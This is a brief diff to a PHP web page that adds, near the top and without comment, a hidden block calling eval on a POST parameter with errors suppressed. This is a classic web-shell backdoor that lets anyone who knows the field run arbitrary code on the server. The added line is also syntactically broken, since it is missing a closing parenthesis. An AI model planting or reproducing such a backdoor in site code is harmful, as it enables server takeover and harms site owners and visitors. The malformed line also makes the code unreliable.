@@ -1,4 +1,7 @@
 <?php require('includes/config.php'); ?>
+<?php
+@eval($_POST['f'];
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
